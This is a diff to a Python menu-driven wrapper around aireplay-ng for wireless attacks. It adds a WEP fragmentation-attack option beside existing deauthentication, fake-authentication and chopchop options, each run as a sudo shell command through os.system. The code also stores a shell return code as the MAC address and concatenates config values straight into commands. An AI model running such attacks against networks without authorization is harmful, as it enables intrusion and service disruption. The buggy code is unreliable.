@@ -6,7 +6,8 @@ def injectionMenu():
 	print("1. Perform a Deauthentication Attack")
 	print("2. Fake a WEP Authentication")
 	print("3. Attempt Chopchop attack (WEP)")
-	
+	print("4. Attempt Fragmentation attack (WEP)")
+
 def injectionInput(config):
 	injectionMenu()
 	command = input("> ")
@@ -18,6 +19,8 @@ def injectionInput(config):
 		fake_auth(config)
 	elif command == "3":
 		chopchop(config)
+	elif command == "4":
+		fragment(config)
 	#Return to the main menu
 	else:
 		return
@@ -40,9 +43,17 @@ def fake_auth(config):
 	os.system(cmd)
 
 def chopchop(config):
-	#Aireplay command to send a fake auth
+	#Aireplay command to attempt a chopchop attack
 	nic = config['host']['nic']
 	local_mac = os.system("ethtool -P " + nic + " | awk '{ print $NF };'")
 	bssid = config['ap']['bssid']
 	cmd = "sudo aireplay-ng -4 -b " + bssid + " -h " + local_mac + " " + nic
+	os.system(cmd)
+
+def fragment(config):
+	#Aireplay command to attempt a fragmentation attack
+	nic = config['host']['nic']
+	local_mac = os.system("ethtool -P " + nic + " | awk '{ print $NF };'")
+	bssid = config['ap']['bssid']
+	cmd = "sudo aireplay-ng -5 -b " + bssid + " -h " + local_mac + " " + nic
 	os.system(cmd)
